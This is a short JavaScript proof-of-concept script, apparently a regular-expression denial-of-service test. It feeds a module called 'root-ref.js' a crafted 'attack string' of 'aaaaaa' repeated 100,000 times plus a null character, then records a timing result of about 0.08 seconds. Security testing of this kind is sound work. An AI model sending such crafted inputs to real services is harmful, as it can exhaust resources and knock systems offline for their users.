import transformer from "./root-ref.js";

//Attack String :""+"aaaaaa"*100000+"\u0000"
var str = "";
for (var i = 0; i < 100000; i++) {
  str += "aaaaaa";
}
str += "\u0000";

const file = {
  source: str,
};

var result = transformer(file);

// real    0m0.077s
// user    0m0.050s
// sys     0m0.013s
